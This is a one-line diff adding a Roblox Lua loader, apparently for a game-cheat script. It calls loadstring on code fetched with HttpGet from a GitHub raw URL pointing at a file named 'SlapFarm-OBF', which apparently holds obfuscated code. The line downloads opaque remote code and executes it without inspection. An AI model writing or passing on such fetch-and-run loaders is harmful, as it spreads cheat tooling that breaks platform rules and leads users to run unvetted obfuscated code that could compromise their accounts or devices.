@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/fizzyscripting/PremiumScripts/refs/heads/main/SlapFarm-OBF'))()
